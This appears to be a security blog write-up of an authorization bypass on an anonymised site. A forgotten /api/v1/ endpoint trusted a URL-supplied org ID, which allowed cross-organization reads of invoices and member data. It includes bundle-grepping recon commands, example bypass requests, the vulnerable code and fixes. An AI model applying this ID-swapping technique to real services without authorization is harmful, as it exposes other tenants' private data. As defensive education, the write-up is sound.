---
title: "Authorization bypass on example.com — reading any org's data via a forgotten API version"
date: 2026-08-08
category: 0day
description: "How an old, unlinked API version skipped the tenant check that the new one enforced — full cross-org read."
tags: [authorization, bolabac, idor, api, writeup]
---

> Target anonymised as **example.com**. Written up for education; tested only against my own accounts.

## TL;DR

`example.com` shipped a shiny `/api/v2/` that correctly scoped every request to your organization.
The old `/api/v1/` was still live, still routed to a handler that trusted a client-supplied
`org_id` — and it **never re-checked** that the org belonged to you. Swapping the id returned any
organization's data.

## Recon

Two accounts, two orgs, both mine (A and B). The dashboard SPA only ever called `/api/v2/…`, but the
JS bundle still referenced older paths:

```bash
# pull the app bundle and grep every path it knows about
curl -s https://example.com/assets/index.js | grep -oE '/api/v[0-9]+/[a-z0-9/_-]+' | sort -u
```

```
/api/v1/orgs/{id}/members
/api/v1/orgs/{id}/invoices
/api/v2/orgs/{id}/members
/api/v2/orgs/{id}/invoices
```

Both `v1` and `v2` were still reachable.

## The check that v2 had and v1 didn't

As my own org **A** (`org_id = 1001`), the v2 call for **B** (`1002`) is correctly denied:

```http
GET /api/v2/orgs/1002/invoices HTTP/1.1
Authorization: Bearer <A's token>
```
```json
{ "error": "forbidden", "status": 403 }
```

The **same request on v1** returns B's data:

```http
GET /api/v1/orgs/1002/invoices HTTP/1.1
Authorization: Bearer <A's token>
```
```json
{ "invoices": [ { "id": 88213, "org_id": 1002, "amount": 4200, "customer": "…" } ] }
```

`200 OK`. A's token, B's invoices. The route authenticated the **user** but never checked the
**object** — the id was trusted straight from the URL.

## Confirming impact (safely)

I only ever swapped between my **own** two orgs. Incrementing/decrementing the id changed which org's
records came back, which proves the control is missing without touching a real tenant:

| Request | Token | `org_id` | Result |
|---|---|---|---|
| `GET /api/v1/orgs/1001/invoices` | A | own | 200 (mine) |
| `GET /api/v1/orgs/1002/invoices` | A | B (mine) | 200 (should be 403) |
| `GET /api/v2/orgs/1002/invoices` | A | B (mine) | 403 (correct) |

Same shape held for `/members` (names, emails, roles). At that point the class is proven: **broken
object-level authorization on the legacy version**.

## Root cause

The tenant check lived in v2's controller, not in shared middleware:

```js
// v2 controller — the guard that mattered
if (req.user.org_id !== Number(req.params.id)) return res.status(403).end();
// v1 controller — same data, guard never added
const rows = await db.invoices.byOrg(req.params.id);   // trusts the URL
return res.json({ invoices: rows });
```

When v2 was written, the authorization moved into the new controller. v1 was "deprecated" — left
running, unlinked from the UI, and never back-ported the fix.

## Fix

- Enforce tenant/object authorization in **shared middleware**, not per-controller, so every version
  inherits it.
- Actually retire deprecated versions (return `410 Gone`), don't just unlink them from the UI.
- Derive the org from the **session/token**, not from a client-supplied id.

## Takeaways

- Always mine the JS bundle for **every** API path and version — the bug is usually the endpoint the
  UI stopped calling.
- Re-test the same object across **every version and every verb**; authorization is frequently added
  in one place and forgotten in another.
- "Unlinked" is not "removed". A forgotten `/v1/` is a live attack surface.
